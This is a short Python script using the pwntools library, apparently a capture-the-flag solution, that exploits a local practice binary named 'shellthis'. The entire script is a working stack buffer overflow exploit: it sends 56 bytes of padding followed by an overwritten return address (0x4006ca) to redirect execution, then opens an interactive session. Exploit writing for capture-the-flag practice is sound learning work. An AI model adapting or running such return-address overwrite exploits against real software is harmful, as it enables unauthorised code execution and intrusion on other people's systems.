from pwn import *

p = process('./shellthis')
# gdb.attach(p, gdbscript='''
# 	b *0x400711
# 	continue
# 	''')

offset = '0'*56
flag = p64(0x4006ca)

payload = offset+flag

p.sendline(payload)
p.interactive()